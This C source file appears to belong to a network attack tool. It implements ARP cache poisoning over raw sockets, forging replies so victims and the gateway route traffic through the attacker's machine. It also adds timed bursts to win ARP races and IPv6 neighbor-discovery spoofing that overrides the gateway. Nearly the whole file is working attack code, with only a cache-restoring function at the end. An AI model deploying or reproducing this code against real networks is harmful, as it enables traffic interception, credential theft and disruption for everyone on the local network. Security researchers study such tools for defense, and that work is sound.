#include "arp_poison.h"
#include "arp_scan.h" // For struct arp_header definition
#include "ndp_block.h"
#include "utils_rate.h"
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

extern unsigned char *get_own_mac(void);

static struct Victim *g_poison_victims = NULL;
static int g_poison_victim_count = 0;
static unsigned char g_poison_gateway_ip[4];
static unsigned char g_poison_gateway_mac[6];
static unsigned char *g_poison_gateway_ipv6_ll = NULL;
static int g_poison_sockfd = -1;
static unsigned char *g_poison_my_mac = NULL;

// Sends a "burst" of packets to ensure we win the ARP race
void execute_poison_burst(void) {
  if (g_poison_sockfd == -1 || !g_poison_victims) return;
  
  printf("[BURST] Heartbeat detected! Sending G-ARP burst...\n");
  for (int b = 0; b < 3; b++) { // Burst of 3
    for (int i = 0; i < g_poison_victim_count; i++) {
      send_arp_reply(g_poison_sockfd, g_poison_victims[i].mac, g_poison_victims[i].ip, g_poison_my_mac, g_poison_gateway_ip);
      send_arp_reply(g_poison_sockfd, g_poison_gateway_mac, g_poison_gateway_ip, g_poison_my_mac, g_poison_victims[i].ip);
    }
    
    // Also burst IPv6 if available
    if (g_poison_gateway_ipv6_ll) {
      send_ndp_ra_block(g_poison_sockfd, g_poison_my_mac, g_poison_gateway_ipv6_ll);
      unsigned char all_nodes_mac[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};
      send_ndp_na_spoof(g_poison_sockfd, all_nodes_mac, g_poison_my_mac, g_poison_gateway_ipv6_ll);
    }
    usleep(10000); // 10ms between rounds in the burst
  }
}

// Sends a single forged ARP reply
int send_arp_reply(int sockfd, unsigned char *target_mac,
                   unsigned char *target_ip, unsigned char *spoofed_mac,
                   unsigned char *spoofed_ip) {
  struct ifreq if_idx;
  struct sockaddr_ll socket_address;
  char ifName[IFNAMSIZ] = "eth0";

  // Prepare socket address
  memset(&socket_address, 0, sizeof(struct sockaddr_ll));
  strcpy(if_idx.ifr_name, ifName);
  if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
    perror("SIOCGIFINDEX");
    return -1;
  }

  socket_address.sll_ifindex = if_idx.ifr_ifindex;
  socket_address.sll_halen = ETH_ALEN;
  memcpy(socket_address.sll_addr, target_mac, 6);

  int frame_length = sizeof(struct ethhdr) + 28; // 28 is standard ARP payload
  char *buffer = malloc(frame_length);
  if (!buffer)
    return -1;
  memset(buffer, 0, frame_length);

  // Build Ethernet header
  struct ethhdr *eth = (struct ethhdr *)buffer;
  memcpy(eth->h_source, spoofed_mac, 6);
  memcpy(eth->h_dest, target_mac, 6);
  eth->h_proto = htons(ETH_P_ARP);

  // Build standard ARP header overlaying the buffer space
  uint16_t *hw_type = (uint16_t *)(buffer + 14);
  uint16_t *proto_type = (uint16_t *)(buffer + 16);
  *hw_type = htons(1);
  *proto_type = htons(ETH_P_IP);
  buffer[18] = 6;
  buffer[19] = 4;

  uint16_t *opcode = (uint16_t *)(buffer + 20);
  *opcode = htons(2); // ARP Reply

  memcpy(buffer + 22, spoofed_mac, 6);
  memcpy(buffer + 28, spoofed_ip, 4);
  memcpy(buffer + 32, target_mac, 6);
  memcpy(buffer + 38, target_ip, 4);

  // Send packet
  if (sendto(sockfd, buffer, frame_length, 0,
             (struct sockaddr *)&socket_address,
             sizeof(struct sockaddr_ll)) < 0) {
    perror("sendto");
    free(buffer);
    return -1;
  }

  free(buffer);
  return 0;
}

// Continuous poisoning loop
void start_poisoning(struct Victim *victims, int victim_count,
                     unsigned char *gateway_ip, unsigned char *gateway_mac,
                     unsigned char *gateway_ipv6_ll) {
  printf("Starting ARP poisoning loop for %d victims...\n", victim_count);
  int sockfd;
  if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
    perror("socket");
    return;
  }

  unsigned char *my_mac = get_own_mac();
  if (!my_mac) {
    fprintf(stderr, "Failed to get own MAC for poisoning.\n");
    close(sockfd);
    return;
  }

  // Infinite loop sending forged packets
  // Setup global state for burst callback
  g_poison_victims = victims;
  g_poison_victim_count = victim_count;
  memcpy(g_poison_gateway_ip, gateway_ip, 4);
  memcpy(g_poison_gateway_mac, gateway_mac, 6);
  g_poison_gateway_ipv6_ll = gateway_ipv6_ll;
  g_poison_sockfd = sockfd;
  g_poison_my_mac = my_mac;

  // Initialize Adaptive Rate Monitor and register burst callback
  set_burst_callback(execute_poison_burst);
  init_rate_monitor(gateway_mac, gateway_ip, gateway_ipv6_ll);

  while (1) {
    for (int i = 0; i < victim_count; i++) {
      // 1. Tell Victim: "I am the Gateway"
      send_arp_reply(sockfd, victims[i].mac, victims[i].ip, my_mac, gateway_ip);

      // 2. Tell Gateway: "I am the Victim"
      send_arp_reply(sockfd, gateway_mac, gateway_ip, my_mac, victims[i].ip);
    }

    // 3. Block IPv6 (NDP Spoofing)
    if (gateway_ipv6_ll) {
      if (send_ndp_ra_block(sockfd, my_mac, gateway_ipv6_ll) == 0) {
        printf("IPv6 Blocking RA sent (High Priority).\n");
      }
      
      // Send unsolicited Neighbor Advertisement to all nodes
      unsigned char all_nodes_mac[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};
      if (send_ndp_na_spoof(sockfd, all_nodes_mac, my_mac, gateway_ipv6_ll) == 0) {
        printf("IPv6 Unsolicited NA sent (Override).\n");
      }
    }

    float interval = get_adaptive_interval();
    printf("Poison packets sent. Sleeping %.1fs...\n", interval);
    usleep((useconds_t)(interval * 1000000));
  }

  free(my_mac);
  close(sockfd);
}

// Sends authentic ARP replies to restore caches
void heal_arp(struct Victim *victims, int victim_count,
              unsigned char *gateway_ip, unsigned char *gateway_mac) {
  printf("\n[HEALING] Restoring ARP caches for %d Victims and Gateway...\n",
         victim_count);
  int sockfd;
  if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
    perror("socket");
    return;
  }

  // Send the authentic replies 3 times to ensure they are received
  for (int j = 0; j < 3; j++) {
    for (int i = 0; i < victim_count; i++) {
      // 1. Tell Victim: "The Gateway is really at the Gateway's MAC"
      send_arp_reply(sockfd, victims[i].mac, victims[i].ip, gateway_mac,
                     gateway_ip);

      // 2. Tell Gateway: "The Victim is really at the Victim's MAC"
      send_arp_reply(sockfd, gateway_mac, gateway_ip, victims[i].mac,
                     victims[i].ip);
    }
    // Sleep briefly to avoid flooding
    usleep(500000);
  }

  close(sockfd);
  printf("[HEALING] ARP Caches successfully restored.\n");
}
